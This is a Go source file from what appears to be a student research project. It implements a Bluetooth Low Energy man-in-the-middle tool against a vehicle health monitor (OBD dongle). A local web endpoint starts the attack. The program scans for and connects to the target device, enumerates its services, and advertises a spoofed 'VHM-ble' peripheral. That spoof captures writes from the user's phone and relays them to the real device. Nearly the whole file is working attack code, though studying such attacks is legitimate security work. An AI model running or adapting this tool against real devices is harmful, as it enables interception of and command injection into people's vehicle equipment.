// Created by Shuja Hussain (shhu@itu.dk) & Harry Singh (hars@itu.dk)
// The original source code can be found on this: https://pkg.go.dev/github.com/paypal/gatt / https://pkg.go.dev/github.com/paypal/gatt
// This version has been modified to support our bachelor project in Smart Health Vehicle monitor exploitation

package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"

	"github.com/paypal/gatt"
	"github.com/paypal/gatt/examples/option"
	"github.com/paypal/gatt/examples/service"
)

var target TargetDevice
var done = make(chan struct{})
var dev gatt.Device
var publicData []byte
var isMobileConnected bool

type TargetDevice struct {
	Name     string   `json:"name"`
	Commands []string `json:"commands"`
}

func onStateChanged(d gatt.Device, s gatt.State) {
	switch s {
	case gatt.StatePoweredOn:
		fmt.Println("| Scanning for '" + target.Name + "'...")
		// When a remote peripheral is discovered, the PeripheralDiscovered Handler is called.
		d.Scan([]gatt.UUID{}, false)
		return
	default:
		d.StopScanning()
	}
}

func onPeriphDiscovered(p gatt.Peripheral, a *gatt.Advertisement, rssi int) {
	if a.LocalName == target.Name {

		// Stop scanning once we've got the peripheral we're looking for.
		p.Device().StopScanning()

		fmt.Println("| Match found: ")
		fmt.Printf("| Peripheral ID:%s, NAME:(%s)\n", p.ID(), p.Name())
		fmt.Println("  Local Name        =", a.LocalName)
		fmt.Println("  TX Power Level    =", a.TxPowerLevel)
		fmt.Println("  Manufacturer Data =", a.ManufacturerData)
		fmt.Println("  Service Data      =", a.ServiceData)
		fmt.Println("")

		// Connect connects to a remote peripheral.
		fmt.Println("| Trying to connect ...")
		p.Device().Connect(p)
	}
}

func onPeriphConnected(p gatt.Peripheral, err error) {
	fmt.Printf("| Successfully connected to %s \n", p.Name())
	fmt.Printf(target.Commands[0])
	defer p.Device().CancelConnection(p)

	// Set Maximum transmission unit
	if err := p.SetMTU(500); err != nil {
		fmt.Printf("Failed to set MTU, err: %s\n", err)
	}

	// Discovery services
	ss, err := p.DiscoverServices(nil)
	if err != nil {
		fmt.Printf("Failed to discover services, err: %s\n", err)
		return
	}

	for _, s := range ss {
		msg := "Service: " + s.UUID().String()
		if len(s.Name()) > 0 {
			msg += " (" + s.Name() + ")"
		}
		fmt.Printf("| Services %s found, but println hides value on purpose. \n", msg)

		// Discovery characteristics
		cs, err := p.DiscoverCharacteristics(nil, s)
		if err != nil {
			fmt.Printf("Failed to discover characteristics, err: %s\n", err)
			continue
		}

		for _, c := range cs {
			msg := "  Characteristic  " + c.UUID().String()
			if len(c.Name()) > 0 {
				msg += " (" + c.Name() + ")"
			}
			msg += "\n    properties    " + c.Properties().String()
			//fmt.Println(msg)

			if strings.Contains(c.Properties().String(), "write") {
				fmt.Println("| Writing to target device ...")
				/*for _, cmd := range target.Commands {
					fmt.Printf("| '%s' sent", cmd)
					p.WriteCharacteristic(c, []byte(cmd+"\r\n"), false)
				}*/

				for isMobileConnected {
					p.WriteCharacteristic(c, publicData, false)
				}
			}

			// Read the characteristic, if possible.
			if (c.Properties() & gatt.CharRead) != 0 {
				//b, err := p.ReadCharacteristic(c)
				if err != nil {
					fmt.Printf("Failed to read characteristic, err: %s\n", err)
					continue
				}
				//fmt.Printf("    value         %x | %q\n", b, b)
			}

			// Discovery descriptors
			ds, err := p.DiscoverDescriptors(nil, c)
			if err != nil {
				fmt.Printf("Failed to discover descriptors, err: %s\n", err)
				continue
			}

			for _, d := range ds {
				msg := "  Descriptor      " + d.UUID().String()
				if len(d.Name()) > 0 {
					msg += " (" + d.Name() + ")"
				}
				fmt.Println(msg)

				// Read descriptor (could fail, if it's not readable)
				b, err := p.ReadDescriptor(d)
				if err != nil {
					fmt.Printf("Failed to read descriptor, err: %s\n", err)
					continue
				}
				fmt.Printf("value %x | %q\n", b, b)
			}

			// Subscribe the characteristic, if possible.
			if (c.Properties() & (gatt.CharNotify | gatt.CharIndicate)) != 0 {
				f := func(c *gatt.Characteristic, b []byte, err error) {
					/*
						%q	a single-quoted character literal safely escaped with Go syntax.
						%x	base 16, with lower-case letters for a-f
						%X	base 16, with upper-case letters for A-F
					*/
					// syntax: HE XA HE XA HE XA HE XA | 'convertToText ' | A = HE, B = XA
					fmt.Printf("| Notified : % X | %q\n | A = '%d', B = '%d'", b, b, b[len(b)-1], b[(len(b)-2)])
				}
				if err := p.SetNotifyValue(c, f); err != nil {
					fmt.Printf("Failed to subscribe characteristic, err: %s\n", err)
					continue
				}
			}

		}
		fmt.Println()
	}

	fmt.Printf("Waiting for 60 seconds to get some notifiations, if any.\n")
}

func onPeriphDisconnected(p gatt.Peripheral, err error) {
	fmt.Println("Disconnected")
	close(done)
}

func startMsg() {
	fmt.Println("----------------------------- BrownMundeGo -----------------------------")
	fmt.Println("| Made by Shuja Hussain & Harry Singh ")
}

func getInformationFromWeb(w http.ResponseWriter, r *http.Request) {
	// Declare a new Person struct.
	var td TargetDevice

	// Try to decode the request body into the struct. If there is an error,
	// respond to the client with the error message and a 400 status code.
	err := json.NewDecoder(r.Body).Decode(&td)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Do something with the TargetDevice struct...
	fmt.Println("{WEB} Target device received from website.")
	target = td
	fmt.Printf("{WEB} target.Name = %s \n", target.Name)
	commandsSplit := "'" + strings.Join(target.Commands, `','`) + `'`
	fmt.Printf("{WEB} target.Commands = %s \n", commandsSplit)
	fmt.Printf(("{WEB} Initialize attack ... \n"))

	initAttack()
}

// An async function that starts a local server

func startServer() {
	fileServer := http.FileServer(http.Dir("./static"))
	http.Handle("/", fileServer)
	http.HandleFunc("/targetdevice/attack", getInformationFromWeb)

	fmt.Printf("| Starting server at port 8080\n")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}

func initAttack() {
	d, err := gatt.NewDevice(option.DefaultClientOptions...)
	if err != nil {
		log.Fatalf("Failed to open device, err: %s\n", err)
		return
	}
	dev = d
	go manInTheMiddleAttack()

	// Register handlers.
	d.Handle(
		gatt.PeripheralDiscovered(onPeriphDiscovered),
		gatt.PeripheralConnected(onPeriphConnected),
		gatt.PeripheralDisconnected(onPeriphDisconnected),
	)
	d.Init(onStateChanged)

	<-done
	fmt.Println("| Attack finished")
}

func NewCountTestService() *gatt.Service {

	s := gatt.NewService(gatt.MustParseUUID("0000fff0-0000-1000-8000-00805f9b34fb"))

	var x gatt.Notifier

	s.AddCharacteristic(gatt.MustParseUUID("0000fff1-0000-1000-8000-00805f9b34fb")).HandleNotifyFunc(
		func(r gatt.Request, n gatt.Notifier) {
			go func() {
				log.Printf("TODO: indicate client when the services are changed 2 ")
				x = n
			}()
		})
	s.AddCharacteristic(gatt.MustParseUUID("0000fff2-0000-1000-8000-00805f9b34fb")).HandleWriteFunc(
		func(r gatt.Request, data []byte) (status byte) {
			isMobileConnected = true
			publicData = data
			log.Println("Wrote: ", string(data))

			/*var Z = ([]byte("ELM327 V1.5\r>"))
			var RV = ([]byte("20.5V\r>"))

			switch true {
			case strings.Contains(dataToString, "Z"):
				x.Write(Z)
			case strings.Contains(dataToString, "RV"):
				x.Write(RV)
			}*/

			return gatt.StatusSuccess
		})
	return s
}

func manInTheMiddleAttack() {
	// Register optional handlers.
	dev.Handle(
		gatt.CentralConnected(func(c gatt.Central) { fmt.Println("Connect: ", c.ID()) }),
		gatt.CentralDisconnected(func(c gatt.Central) { isMobileConnected = false /*fmt.Println("Disconnect: ", c.ID())*/ }),
	)
	// A mandatory handler for monitoring device state.
	onStateChanged := func(d gatt.Device, s gatt.State) {
		fmt.Printf("State: %s\n", s)
		switch s {
		case gatt.StatePoweredOn:
			// Setup GAP and GATT services for Linux implementation.
			// OS X doesn't export the access of these services.
			d.AddService(service.NewGapService("VHM-ble")) // no effect on OS X
			d.AddService(service.NewGattService())         // no effect on OS X

			// A simple count service for demo.
			s1 := NewCountTestService()
			d.AddService(s1)

			// Advertise device name and service's UUIDs.
			d.AdvertiseNameAndServices("VHM-ble", []gatt.UUID{s1.UUID()})

			// Advertise as an OpenBeacon iBeacon
			d.AdvertiseIBeacon(gatt.MustParseUUID("AA6062F098CA42118EC4193EB73CCEB6"), 1, 2, -59)

		default:
		}
	}

	dev.Init(onStateChanged)
	select {}
}

func main() {
	startMsg()
	startServer()
}
